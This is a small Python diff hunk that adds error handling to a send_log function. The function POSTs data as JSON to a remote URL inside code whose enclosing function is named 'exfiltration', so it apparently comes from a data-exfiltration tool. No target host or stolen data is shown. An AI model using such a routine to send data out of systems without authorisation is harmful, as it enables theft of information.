@@ -58,7 +58,10 @@ def exfiltration():
 def send_log(data):
     try:
         res = requests.post(URL, json=data)
-        print("Sent:", data, "=>", res.json())
+        try:
+            print("Sent:", data, "=>", res.json())
+        except:
+            print("Sent:", data, "=> Invalid response:", res.text)
     except Exception as e:
         print("Error:", e)
 
